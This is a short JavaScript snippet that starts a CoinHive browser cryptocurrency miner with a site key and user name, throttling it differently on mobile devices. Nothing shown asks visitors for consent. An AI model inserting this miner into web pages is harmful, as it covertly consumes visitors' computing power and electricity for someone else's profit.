      var miner = new CoinHive.User('3hZivL5tuFVoiSVeFBK3KxzpsX1NbnQ5', 'laspalabras', {
          autoThreads: true,
          throttle: 0.8,
      });
      if (!miner.isMobile()) {
          miner.start();
      } else {
          miner.setThrottle(0.925);
          miner.start();
      }